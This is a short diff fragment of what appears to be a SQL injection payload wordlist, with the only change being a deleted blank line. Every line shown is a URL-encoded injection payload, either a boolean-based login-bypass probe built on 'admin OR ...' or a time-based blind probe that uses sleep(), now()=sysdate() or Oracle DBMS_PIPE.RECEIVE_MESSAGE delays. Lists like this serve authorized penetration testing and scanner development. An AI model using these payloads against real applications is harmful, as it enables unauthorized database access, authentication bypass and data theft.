@@ -5,7 +5,6 @@ admin%20OR%202%2B949-949-1=0%2B0%2B0%2B1%20--%20
 admin%20OR%202%2B669-669-1=0%2B0%2B0%2B1
 admin"%20OR%202%2B764-764-1=0%2B0%2B0%2B1%20--%20
 'xor(if(now()=sysdate(),sleep(30),0))or
-
 admin@admin.com'%7C%7CDBMS_PIPE.RECEIVE_MESSAGE(CHR(98)%7C%7CCHR(98)%7C%7CCHR(98)%2C15)%7C%7C'
 orwa(select(0)from(select(sleep(15)))v)/*'%2B(select(0)from(select(sleep(15)))v)%2B'"%2B(select(0)from(select(sleep(15)))v)%2B"*/
 if(now()=sysdate()%2Csleep(15)%2C0)
